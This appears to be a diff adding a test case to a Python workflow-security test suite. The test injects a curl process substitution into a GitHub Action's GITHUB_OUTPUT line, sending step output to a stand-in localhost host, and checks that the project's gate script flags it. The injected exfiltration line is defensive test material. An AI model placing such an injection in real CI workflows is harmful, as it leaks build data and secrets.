@@ -42140,6 +42140,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("curl -W huruf tak dikenal membunuh biner (Audit 2941)", rc == 0)
         shutil.rmtree(sub1989, ignore_errors=True)
+        sub1990 = klon(tmp, "sub1990")
+        berkas_aksi1990 = os.path.join(
+            sub1990, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1990, encoding="utf-8") as f:
+            isi_aksi1990 = f.read()
+        baris_aksi1990 = [b for b in isi_aksi1990.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1990 = isi_aksi1990.replace(
+                baris_aksi1990,
+                baris_aksi1990.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -G -I -d @- http://127.0.0.1:9/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1990 != isi_aksi1990, \
+            "suntikan aksi1990 tidak menembak"
+        with open(berkas_aksi1990, "w", encoding="utf-8") as f:
+            f.write(isi_baru1990)
+        rc, out = jalan(sub1990,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl -G menetralkan data x head (Audit 2942)", rc != 0)
+        shutil.rmtree(sub1990, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
